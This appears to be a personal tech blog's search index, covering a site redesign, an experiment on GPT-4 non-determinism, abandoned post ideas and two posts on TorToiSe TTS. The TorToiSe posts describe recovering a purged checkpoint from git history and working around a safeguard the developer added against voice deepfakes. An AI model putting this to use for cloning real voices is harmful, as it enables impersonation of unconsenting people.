[{"categories":["tech"],"content":"Under new management","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":" The site used to look like this. Ugly, right? To my grand audience of absolutely nobody, I present: this blog, but better! I‚Äôve been putting this off for a while. I don‚Äôt like to think of myself as a web designer, and I didn‚Äôt have compelling reasons to work on setting up anything more complex than the default recommended Jekyll+Pages setup. This changes today. I‚Äôll be out of the military soon, and that means I need a üåü stunning üåü website for employers to see. Plus, I‚Äôve gotten the writer‚Äôs bug as of recent, and I want a place to throw my words on that doesn‚Äôt look as bad as v1 of this site. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:0:0","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Finding Hugo Like many other Rust developers, I read Faster Than Lime. Their blog looks really nice, and I wanted to copy it, so I looked for their blog post on how they developed their site. Answer: really complex stuff! But then I read this part: I definitely remember using nanoc (Ruby), and switching to jekyll (Ruby) at some point. When I launched the Patreon integration, I was using hugo. Now, I really don‚Äôt want to be spending any time saying negative things about projects in this post - not when there‚Äôs so much cool stuff to show off! So all I‚Äôll say is this: hugo was easy to get started with, and it stayed relatively out of my way. I forked one of the more minimal themes, and added the pieces I wanted: cool bear‚Äôs hot tip, some navigation, etc. Well, that‚Äôs not exactly an endorsement, but I‚Äôll take it over the less trodden path. Let‚Äôs google, ‚ÄúHugo themes‚Äù: Cropped for brevity; there are hundreds of these themes on the page. That one on the right looks pretty good! Let‚Äôs try it. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:0","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Papermod Fast and pretty good! Setup worked entirely as expected, except‚Ä¶ I wanted to mix the centered ‚Äúprofile mode‚Äù (pictured above) with a post list, but that wasn‚Äôt a default option Their TOCs uses the default Hugo style. It doesn‚Äôt look pretty enough: Syntax highlighting was somewhat wrong. See the unhighlighted second Ls here: So I decided to look for another theme. I eventually settled with LoveIt. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:1","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Installing LoveIt I faced many, many technical problems trying to get this theme to run. In order: After installing the theme as a submodule, I got an error running hugo server -D: Module \"LoveIt\" is not compatible with this Hugo version; This was confusing because I had the latest Hugo version (v0.101), and the stated required version for the LoveIt theme was v0.64 A round of googling later, and I figure out the error message actually happens because my hugo installation wasn‚Äôt compiled with the SCSS extension. I try to download an -extended release, but I find out that the hugo main repository does not publish -extended releases for arm64 CPUs, which I need because I‚Äôm using a Raspberry Pi for this. I attempt to compile the extended version of hugo directly on my RPi. This fails, because go install requires more than 0.5 GB of memory, which my little tiny machine cannot offer. I attempt to cross-compile Hugo from a better machine. This fails with an abstruse error message. I eventually figure out that it failed because compilation requires go\u003e=1.18. After updating, the cross-compilation fails again, because Hugo depends on a C/C++ library that is more difficult to cross compile (this is the same reason that the main repository does not give -extended releases) I luckily find a repository (https://github.com/hugoguru/dist-hugo/releases) that has compiled -extended versions of Hugo for ARM. This ends the torment, mostly. After that mess, it runs: Hurray. Let‚Äôs move on. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:2","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Changes So, what‚Äôs new about the site? Is it just a CSS refresh? Not exactly. Although I was mostly motivated by the idea of getting the site to look ‚ú® prettier ‚ú®, the new framework comes with several added features: Searching. The screenshot above shows this. Emojis, like the ones above. Post reactions! With the power of giscus: Shortcode. I make good use of them in my about page. Better development experience. You won‚Äôt see this on the site, but the file/post structure for Hugo is much more pleasant than Jekyll was. I also made a few small changes to the LoveIt theme for this site, mostly to embed images more easily. See here ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:1:3","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"Moving forward I didn‚Äôt do all of this designer work just to let it rot like the last one. Moving forward, I‚Äôll be pushing posts to this site weekly, whether anyone reads them or not. It‚Äôll be somewhat like Matt Rickard‚Äôs blog: a regular stream of short posts on tech things. I have enough of a backlog to keep this up for several months, and I plan on going on ad infinitum. ","date":"August 13, 2022","objectID":"/blog/blog-refurbishment/:2:0","tags":["blog","hugo","my setups"],"title":"Blog Refurbishment","uri":"/blog/blog-refurbishment/"},{"categories":["tech"],"content":"It‚Äôs well-known at this point that GPT-4/GPT-3.5-turbo is non-deterministic, even at temperature=0.0. This is an odd behavior if you‚Äôre used to dense decoder-only models, where temp=0 should imply greedy sampling which should imply full determinism, because the logits for the next token should be a pure function of the input sequence \u0026 the model weights. When asked about this behaviour at the developer roundtables during OpenAI‚Äôs World Tour, the responses of the members of technical staff were something along the lines of, Honestly, we‚Äôre confused as well. We think there might be some bug in our systems, or some non-determinism in optimized floating point calculations‚Ä¶ And internally, I was thinking ‚Äì okay, I know the latter point is true sometimes, and maybe OpenAI doesn‚Äôt have enough engineers to look into a problem as small as this. I felt a little bit confused when I noticed a reference to this behavior over 3 years ago ‚Äì 3 years, and this couldn‚Äôt be fixed? But I didn‚Äôt have a meaningful alternative explanation for the phenomenon. After all, why would you want to keep things random? Ilya‚Äôs always going on about reliability, right? There was no way OpenAI wanted to keep determinism bugged, so an unresolvable hardware limitation was the best explanation. 3 months later, reading a paper while on board a boring flight home, I have my answer. In the recent Soft MoE paper, there was an interesting blurb in Section 2.2 that sparked a connection: Under capacity constraints, all Sparse MoE approaches route tokens in groups of a fixed size and enforce (or encourage) balance within the group. When groups contain tokens from different sequences or inputs, these tokens often compete against each other for available spots in expert buffers. As a consequence, the model is no longer deterministic at the sequence-level, but only at the batch-level, as some input sequences may affect the final prediction for other inputs It is currently public knowledge that GPT-4 is a Mixture of Experts model. Given that GPT-4 was trained before Q2 2022, and that Sparse Mixture-of-Experts have existed long before that, I think the following hypothesis is justified: The GPT-4 API is hosted with a backend that does batched inference. Although some of the randomness may be explained by other factors, the vast majority of non-determinism in the API is explainable by its Sparse MoE architecture failing to enforce per-sequence determinism. This is either completely wrong, or something that was already obvious and well-known to people developing MoE models. How can we verify this? ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:0:0","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"Are you really sure it isn‚Äôt hardware? Not yet. Let‚Äôs ask GPT-4 to write a script to test our hypothesis: import os import json import tqdm import openai from time import sleep from pathlib import Path chat_models = [\"gpt-4\", \"gpt-3.5-turbo\"] message_history = [ {\"role\": \"system\", \"content\": \"You are a helpful assistant.\"}, {\"role\": \"user\", \"content\": \"Write a unique, surprising, extremely randomized story with highly unpredictable changes of events.\"} ] completion_models = [\"text-davinci-003\", \"text-davinci-001\", \"davinci-instruct-beta\", \"davinci\"] prompt = \"[System: You are a helpful assistant]\\n\\nUser: Write a unique, surprising, extremely randomized story with highly unpredictable changes of events.\\n\\nAI:\" results = [] import time class TimeIt: def __init__(self, name): self.name = name def __enter__(self): self.start = time.time() def __exit__(self, *args): print(f\"{self.name} took {time.time() - self.start} seconds\") C = 30 # number of completions to make per model N = 128 # max_tokens # Testing chat models for model in chat_models: sequences = set() errors = 0 # although I track errors, at no point were any errors ever emitted with TimeIt(model): for _ in range(C): try: completion = openai.ChatCompletion.create( model=model, messages=message_history, max_tokens=N, temperature=0, logit_bias={\"100257\": -100.0}, # this doesn't really do anything, because chat models don't do \u003c|endoftext|\u003e much ) sequences.add(completion.choices[0].message['content']) sleep(1) # cheaply avoid rate limiting except Exception as e: print('something went wrong for', model, e) errors += 1 print(f\"\\nModel {model} created {len(sequences)} ({errors=}) unique sequences:\") print(json.dumps(list(sequences))) results.append((len(sequences), model)) # Testing completion models for model in completion_models: sequences = set() errors = 0 with TimeIt(model): for _ in range(C): try: completion = openai.Completion.create( model=model, prompt=prompt, max_tokens=N, temperature=0, logit_bias = {\"50256\": -100.0}, # prevent EOS ) sequences.add(completion.choices[0].text) sleep(1) except Exception as e: print('something went wrong for', model, e) errors += 1 print(f\"\\nModel {model} created {len(sequences)} ({errors=}) unique sequences:\") print(json.dumps(list(sequences))) results.append((len(sequences), model)) # Printing table of results print(\"\\nTable of Results:\") print(\"Num_Sequences\\tModel_Name\") for num_sequences, model_name in results: print(f\"{num_sequences}\\t{model_name}\") This final script is a little different from what you‚Äôd see if you clicked on the share link. I had to redo the script a few times along the way, because of a few problems: the OpenAI API was taking very long to respond. I had to add timestamp logging to check I wasn‚Äôt doing something wrong ‚Äì I wasn‚Äôt, the API was simply really slow, with nearly 10 seconds of delay to call even 3.5 turbo. I wonder why? some completion models were truncating their responses very early. I added a logit bias against EOS to try to fix this. Related: there is no equivalent bias against the \u003c|im_end|\u003e token; the API returns, Invalid key in 'logit_bias': 100265. Maximum value is 100257. 100265 is the accurate value for \u003c|im_end|\u003e: I figured this lack-of-logit-bias problem for the chat models was a non-issue ‚Äì most completions reached the max token length, and they were absurdly more non-deterministic anyway (adding the logit bias would realistically only increase the number of unique sequences) An hour of waiting and scripting later, and I got confirmation: ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:1:0","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"Empirical Results Here are the results (3 attempts, N=30, max_tokens=128): Model Name Unique Completions (/30) Average (/30) Notes gpt-4 12,11,12 11.67 gpt-3.5-turbo 4,4,3 3.67 text-davinci-003 3,2,4 3.00 text-davinci-001 2,2,2 2.00 davinci-instruct-beta 1,1,1 deterministic Outputs deteriorated into repeated loop davinci 1,1,1 deterministic Outputs deteriorated into repeated loop Before I noticed the logit_bias problem, I also obtained the following results (max_tokens=256): Model Name Unique Completions (/30) Notes gpt-4 30 gpt-3.5-turbo 9 text-davinci-003 5 text-davinci-001 2 Noticed the logit bias problem at this point ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:1:1","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"Yes, I‚Äôm sure The number of unique completions from GPT-4 is ridiculously high ‚Äì practically always non-deterministic with longer outputs. This almost certainly confirms that something is up with GPT-4. Additionally, all other models that do not collapse into a repetitive useless loop experience some degree of non-determinism as well. This lines up with the public claim that unreliable GPU calculations are responsible for some degree of randomness. However, I‚Äôm still partially confused by the gradual increase in randomness from text-davinci-001 up to gpt-3.5-turbo. I don‚Äôt have a neat explanation for why 003 is reliably more random than 001, or turbo more so than 003. Although I expect only the chat models to be MoE models, and not any of the 3.5 completion models, I don‚Äôt feel confident based on the current evidence available. This is only evidence that something is causing GPT-4 to be much, much more non-deterministic than other models. Maybe I‚Äôm still completely wrong about the MoE part. Maybe it‚Äôs just because of parameter count. (but then ‚Äì why would Turbo be more unpredictable than davinci? Turbo‚Äôs faster; if you assumed the same architecture, Turbo ought to be smaller) ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:1:2","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"Implications It‚Äôs actually pretty crazy to me, that this looks true. For a few reasons: ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:2:0","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"We‚Äôre so far behind If the non-determinism is an inherent feature of batched inference with Sparse MoE, then this fact should be visibly obvious to anyone that works with models in that vein. Given that the vast majority of GPT-4 users still have no idea what is causing their API calls to be unreliable, it should be concluded that (I am completely wrong, OR) too few people know anything about MoE models to launch this explanation into the public consciousness. It implies that Google Deepmind knew, and found it trivial enough to write as a throwaway sentence in a paper. It implies that I should be a lot more bullish on them, and a lot more bearish against every other wannabe foundation model org that‚Äôs still working on dense models only. ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:2:1","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"GPT-3.5-Turbo may be MoE too I heard a rumour, once, about 3.5-turbo sharing the same architecture as GPT-4; just with much much less parameters than it, or even GPT-3. And, when I heard it, I was thinking: Nah, that sounds too complicated for a small public model. Why wouldn‚Äôt they just use a dense one? Fits on one GPU, no complexity overhead, really simple to optimise‚Ä¶ Fast forward to now, and we‚Äôre still suffering a regime where it takes 70B parameters to meet Turbo‚Äôs performance ‚Äì a number which just doesn‚Äôt make sense for how much traffic OpenAI‚Äôs handling, and how much speed they get. It‚Äôs also easy to notice that Turbo is the only other model in the API that has its logprobs restricted from public view. The common explanation was that they were restricted to prevent increased accuracy in distillation, something which sounds a little bit naive today given Orca and others. OpenAI has also publicly stated that they‚Äôre working on getting the logprobs integrated into ChatCompletions, making ‚Äúprevent distillation‚Äù less likely than ‚Äúthis is hard to engineer reliably because they‚Äôre inherently too random right now‚Äù: But, still, as I said earlier ‚Äì not fully confident on this one. Maybe someone should open a prediction market? ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:2:2","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["tech"],"content":"Conclusion Everyone knows that OpenAI‚Äôs GPT models are non-deterministic at temperature=0 It is typically attributed to non-deterministic CUDA optimised floating point op inaccuracies I present a different hypothesis: batched inference in sparse MoE models are the root cause of most non-determinism in the GPT-4 API. I explain why this is a neater hypothesis than the previous one. I empirically demonstrate that API calls to GPT-4 (and potentially some 3.5 models) are substantially more non-deterministic than other OpenAI models. I speculate that GPT-3.5-turbo may be MoE as well, due to speed + non-det + logprobs removal. ","date":"August 5, 2023","objectID":"/blog/non-determinism-in-gpt-4/:3:0","tags":["openai","machine learning","moe"],"title":"Non-determinism in GPT-4 is caused by Sparse MoE","uri":"/blog/non-determinism-in-gpt-4/"},{"categories":["meta"],"content":"Despite the dead appearance of this blog, I actually think about it surprisingly often! Over the years, I‚Äôve written a number of draft blogs or summaries that I simply ended up dumped at varying stages of completion. I‚Äôm pretty sure I had more of these (where‚Äôs disco-narrator-3?), but I can‚Äôt find them. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:0:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[21/05] Speedpwning Setup Back when I was still doing cybersecurity, I had a minor obsession with getting my pwning speed to be as quick as possible. This was primarily motivated by the fun of optimizing stuff \u0026\u0026 the allure of first blood prizes on many CTFs. The post would‚Äôve described my personal process of pwning, going into a detailed, step-by-step description of what I do for an example dummy challenge. [This would‚Äôve been great training data for a Large Language Model]. What I slowly came to realise, in the course of detailing out my exact process, was how excruciatingly slow I actually was! The dumb, trivially automatable steps that I‚Äôd been doing subconsciously for so long were laid to bare in text ‚Äì it was too much for me to bear. I replaced the top header of the draft post with a description: \"DO NOT PUBLISH THIS PLEASE FOR GODS SAKE\", and never touched it again. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:1:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[22/01] SCTF 3.0 postmortem As the ~chief organiser for Sieberrsec CTF 3.0, I was going to write this huge postmortem about everything we had done to plan \u0026 execute it, all the various interesting problems we handled (from drama and contributors to hosting and bureaucracy), some odd-ball theories on CTF design (~novel thoughts on how score decay should work), etc. I don‚Äôt know why I never finished this. It would‚Äôve been a great post, and I remember having sufficient go-ahead from others involved to publish with appropriate PII redaction. I have logs indicating that I tried rewriting this again in 22/08; that attempt obviously failed from an 8 month memory decay. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:2:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[22/10] Hardware failure This was going to be a short post describing the problems I was having with my new personal desktop, published as an excuse for the missing Disco Narrator post on that week. I didn‚Äôt publish it because I felt it was a weak excuse, It revealed how incompetent I was at handling hardware-related projects In hindsight, it would‚Äôve been better to expose that problem to simply allow myself to be corrected by smarter people. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:3:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[22/11] ‚ÄúIs it a tool?‚Äù The early era of Stable Diffusion‚Äôs release was a fun time for political discussions on the role of AI in society. I was tired of seeing the 203958th bad take on AI art, and wanted to write a post that would elucidate the correct position for everyone to read and learn from. Hopefully you can see why that was one of my dumbest blog ideas yet. Individuals have absolutely described every niche idea I covered in the document at some point; the problem is memetic survivability, not the existence proof. It might‚Äôve made a difference if I had executed it much earlier, say August, before the ditches were dug and positions got entrenched and everyone had written the bottom line. ‚Ä¶I still like some of the ideas I wrote back then, though. Like, The immediate, knee-jerk response I made, the first time I heard this, was to point out the qualitative differences between photography (typically a basis for comparison) and AI art, while also emphasising the skulls that have been left behind in the wake of other technological advancements (how many people mold pots? How many taliors? How many trickshaw pullers?) But I‚Äôm not really here for that I think the position is a weakman, ‚Ä¶ or ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:4:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"How volume affects perception or ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:4:1","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"Inpainting is a historical aberration or (most importantly) I sincerely don‚Äôt think any of this will be relevant within a year from now. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:4:2","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[23/02] ML Paper Roundup #1 This would‚Äôve been a pilot post for a series ‚Äì a repeated weekly/biweekly post of papers I thought were interesting, had read in full, and my review of them. I did this because I was interested in applying for tldr.tech‚Äôs open job application for someone who paid attention to AI news well, and wanted to have something to point on my blog to show, ‚ÄúYeah I pay attention to this stuff, just look!‚Äù Nowadays, I kind-of-sometimes do this with tweet threads, but I don‚Äôt have anywhere near enough alpha to say anything novel 99% of the time. It was a lot easier to write (publicly) novel opinions about AK papers in February than it is now, I feel. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:5:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[23/03] Selling out This was a post describing how I got poached by TTS companies, effectively ‚Äúselling out‚Äù instead of continuing to work on open source. I wrote a full draft of the entire thing, which included a segment advertising mrq‚Äôs AI-Voice-Cloning repository as a successor to my two repositories, which I ended up doing on the actual repos instead. I shied away from clicking the post button at the time, because I expected it would have a high chance of causing my job offer to implode. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:6:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[23/04] Experiences with the TTS Industry This post would‚Äôve described: why I happened to do some OSS TTS work the strangeness of that leading to recruiters looking for me the process of learning tech negotiation signing on and shutting down OSS work why I quit within a month of boredom This did not get written much in detail because my life kept getting more and more complicated after that point. Which brings me into the next post‚Ä¶ ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:7:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[23/06] The Branching Trees of Life This is a post about how trivial coin-flip like decisions have drastically changed my life, which necessarily includes everything that‚Äôs happened to me with the TTS industry, but also a lot of other funny coincidences. The document is ~complete, I just don‚Äôt want to publish it yet for Strategic Reasons‚Ñ¢ ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:8:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["meta"],"content":"[23/06] REDACTED This was a post about $TOPIC. I was halfway through writing before I remembered what happened to the other article about $TOPIC, and decided that making it public was a bad idea. Then, interlocutors online instructed me to do it anyway, and I wrote more, but realised my writing skills had atrophied greatly over the last year, and didn‚Äôt want to publish the low-quality verbiage I had written. Now, I‚Äôm writing and publishing a new post with that same trash writing. I‚Äôm still not going to publish this one because of strategic reasons, but these strategic limitations shouldn‚Äôt stop me from writing what happened elsewhere. ","date":"July 2, 2023","objectID":"/blog/dumped-blog-ideas/:9:0","tags":["blog","meta","scraps"],"title":"Dumped Blog Ideas","uri":"/blog/dumped-blog-ideas/"},{"categories":["tech"],"content":"Five days ago, I published a blog post, describing why TorToiSe could not be fine-tuned. Today, I have released a fork of DL-Art-School with TorToiSe fine-tuning code. How did that happen? ","date":"February 16, 2023","objectID":"/blog/tortoise-fine-tuned/:0:0","tags":["machine learning","tts"],"title":"Why can TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuned/"},{"categories":["tech"],"content":"The dVAE The crux of the previous article was the missing model ‚Äì the VQVAE, or discrete-VAE (dVAE). Without it, it is impossible to train any part of the model other than the diffuser and the vocoder, which is not at all sufficient for voice emulation. Approximately 8 hours before the time of writing, I was informed of an incredible observation: that the dVAE checkpoint had actually once existed on the tortoise huggingface repository, before being purged: This was, to put politely, a colossal mistake on the part of the üê¢ developer. git repositories track the full history of the project, including deleted files. The correct move would have been to delete the repository \u0026\u0026 reupload everything ‚Äì something I suspect he might take the agency to do now, when it is too late. I refuse to believe that a developer of his caliber could‚Äôve been unaware that git repositories store the histories of removed files, so I can only conclude he must‚Äôve expected that no one intelligent enough to spot it would try to unleash fine-tuning code to the world. In any case, the dVAE is now public. What can be done? ","date":"February 16, 2023","objectID":"/blog/tortoise-fine-tuned/:1:0","tags":["machine learning","tts"],"title":"Why can TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuned/"},{"categories":["tech"],"content":"Fine-tuning with DLAS I spent the next 6 hours getting neonbjb‚Äôs Deep Learning Art School project to run on my local hardware. In no particular order, the problems I faced were: model dimension mismatches. The VQVAE‚Äôs cookbook_dim was defined here, here, here, and in a lot of other places as cookbook_dim=256. The dvae.pth checkpoint has a cookbook_dim of 512. I initially intepreted this as a sign that it was an experimental vqvae that would fail to train well, but I proved that wrong about an hour ago, so I‚Äôm a bit lost. ‚ÄúEvery single last piece of public documentation was wrong‚Äù sounds like an unlikely mistake. UnifiedVoice. I copied the AR model configs from here and spliced them together with the longer VQVAE config defined above, and the parameters were mostly fine. The mismatches came in dealing with the specific kwargs for the UnifiedVoice class, or more specifically, the three separate definitions of it, all of which were incompatible with the actual tortoise-tts repo‚Äôs definition. I eventually realised that types=1 was equivalent to a no-op in all unifiedvoice configs, which let me work with the uv2 definition. installation issues. There were some dynamic import errors with CLIP that I made a commit to patch. Dependency hell with the old requirements file. Expected hardcoded experiment files that were missing. Doesn‚Äôt matter, I fixed them in the fork. hyperparameter tuning. I say tuning, but what I really did was to make a few lucky guesses that worked out. The repo is here, if you want to see it. There are test samples on the page. ","date":"February 16, 2023","objectID":"/blog/tortoise-fine-tuned/:2:0","tags":["machine learning","tts"],"title":"Why can TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuned/"},{"categories":["tech"],"content":"TorToiSe üê¢ is an open-source Text-To-Speech (TTS) neural network that creates fairly authentic \u0026 realistic voices. Checkpoints for local inference have been available since April last year, but its users are seemingly unable to fine-tune the model with additional voice data. Why is this the case, and how could it be fixed? ","date":"February 11, 2023","objectID":"/blog/tortoise-fine-tuning/:0:0","tags":["machine learning","TTS"],"title":"Why can't TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuning/"},{"categories":["tech"],"content":"Preamble First, let‚Äôs understand the situation. The code, design, and training details for TorToiSe are well-documented. The main repo contains all of the code needed to download and run the TTS models (which are hosted on huggingface). The code for training TorToiSe from scratch is covered under the DL-Art-School project, and the overall process is well-documented in their draft paper. With all of this available, it would be incredibly surprising if no one had successfully fine-tuned the model for their own purposes. As it turns out, someone has: What I ended up doing instead was fine-tuning the TorToiSe models on several hundred hours of clips from the Lex Fridman podcast. I picked Lex‚Äôs podcast because it‚Äôs one of my favourites and he frequently talks about the concepts I want to explore with this project. His podcast was initially called ‚Äúthe Artificial Intelligence Podcast‚Äù which I also find very fitting. I won‚Äôt go into the details of how I fine-tuned the model since there are some concerns with this being used maliciously. If you‚Äôre interested in fine-tuning your own model, to save you some time I will say that a critical component needed to do it has since been removed from the public release. So you won‚Äôt be able to do it without re-training some of the models needed from scratch. ‚Äì @lexman_ai A few searches on the GitHub repo later, and the ‚Äòcritical component‚Äô is revealed: This model is extremely potent when fine-tuned. It can be easily used to make deep-fake voiceovers of people. I‚Äôm sure you‚Äôve heard the Joe Rogan and Steve Jobs podcast - that was Tortoise. Withholding the VQVAE which is required to perform that fine-tuning is my way of de-weaponizing it, to an extent. ‚Äì @neonbjb ","date":"February 11, 2023","objectID":"/blog/tortoise-fine-tuning/:1:0","tags":["machine learning","TTS"],"title":"Why can't TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuning/"},{"categories":["tech"],"content":"Premise The ‚Äòcritical component‚Äô that has not been released is the ‚ÄúVQVAE‚Äù (or discrete-VAE), a model which (in this case) can encode/decode spectrograms into/from a list of integers (‚ÄúMEL tokens‚Äù) in the range [0,8192). The VQVAE is necessary for training, but also irrelevant for inference. During training, the model is used to convert training data (the spectrograms of raw audio files) to discrete tokens that can be used by the GPT model (as predicted outputs) and the CLVP model (as inputs): During inference, the MEL tokens are simply generated by the GPT model: If none of that makes sense to you, well shit, I tried. I recommend reading the architectural design doc and the tortoise source code, especially api.py and models/autoregressive.py. So, you need the VQVAE for fine-tuning. Okay, the code for it is here, the training hyperparameters are written here, and the dataset is‚Ä¶ I independently built an extended TTS dataset composed of audiobooks and podcasts scraped from the web. This data was split on 500ms silences, and any audio clip between 5-20 seconds was kept. I then fed the resulting clips through a pipeline of classifiers that I trained which remove any audio with background noise, music, poor quality (such as phone calls), multiple voices speaking at once and reverb. Due to disk space limitations, I was forced to limit the amount of scraping. The end result was 49,000 hours of cleaned audio clips. I transcribed this dataset using a wav2vec2-large model. I personally fine-tuned this model to predict punctuation, as quotation marks, commas and exclamation marks are important for the purposes of generating speech but are not generally included in the training of speech recognition models. Fine-tuning was performed on LibriTTS and HiFiTTS and the pretrained model weights and transcription scripts can be found here. ‚Äì Appendix I - Extended Dataset Collection ‚Ä¶absent, but probably not too difficult to emulate with a combination of Whisper on LibriLight, plus some additional scraping of YouTube. Is that it? ","date":"February 11, 2023","objectID":"/blog/tortoise-fine-tuning/:2:0","tags":["machine learning","TTS"],"title":"Why can't TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuning/"},{"categories":["tech"],"content":"Problem Unfortunately, this is not the end. Quoting from yet another issue: If you are interested in the VQVAE model itself, I would be glad to divulge training details for it so you can build your own. It will not be compatible with the Tortoise codes, though (unless you are really lucky. :) ) To understand what this means, it is necessary to describe how the VQVAE works. If you‚Äôd like a more accurate description with more detail, I recommend reading this blog. But in simple terms: a codebook (list) of K arrays, each filled with dim random floating point values, is created for the model the encoder converts a spectrogram to a series of arrays of length dim. for each array produced, the codebook array with the closest euclidean distance is picked. the index of each codebook array picked corresponds to the MEL token the decoder converts the series of codebook arrays back into a spectrogram; the whole network is trained to minimise the reconstruction loss of that spectrogram The codebook here is the problem. A fresh VQVAE, trained from scratch, would have a completely different codebook, and would fail to learn the same internal representations for audio. Or, to be more concrete: if, given a short audio clip, the original VQVAE produces the MEL tokens [39, 3258, 1892, 8101], the new VQVAE is extremely likely to produce a completely different list of tokens, like [2814, 3250, 982, 5832], even if trained perfectly to negligible loss. So, if you trained a fresh VQVAE from scratch, you would have to train the entirety of TorToiSe from scratch (ignoring the vocoder) as well to get it to work. Not ideal. Surely there has to be some way to recreate the original VQVAE? ","date":"February 11, 2023","objectID":"/blog/tortoise-fine-tuning/:3:0","tags":["machine learning","TTS"],"title":"Why can't TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuning/"},{"categories":["tech"],"content":"Proposal When I quoted @lexman_ai above, he said: So you won‚Äôt be able to do it without re-training some of the models needed from scratch. Some of the models doesn‚Äôt sound like all of the models. Could it be possible to train a new VQVAE, while avoiding the problems I mentioned above? Everything below this line is baseless speculation, so take it with a heap of salt Baseless Speculation Formally, we can define the encoder/decoder pair of the VQVAE as functions $f(x) = z, g(z) = \\hat x$, where $$g(f(x)) \\approx x$$ Informally, x is a mel spectrogram, z is a list of MEL tokens, and f is a 1D resnet. Formally, our goal is to create a new encoder, $f‚Äô(x)$, such that $$f‚Äô(x) \\approx f(x)$$ for a varied distribution of values of $x$ and $z$. Informally, you could generate a large dataset of synthetic [x,z] pairs by running inference on TorToiSe‚Äôs GPT model a lot of times, and train an encoder directly to try to predict z from x. You would have to replace the overall reconstruction loss function of the VQVAE with a different loss function (MSE?) that minimises the difference between the expected cookbook array vs the output array of the encoder, and also change up all of the training hyperparameters. Would it work? I don‚Äôt know, but I can imagine a number of ways this could go 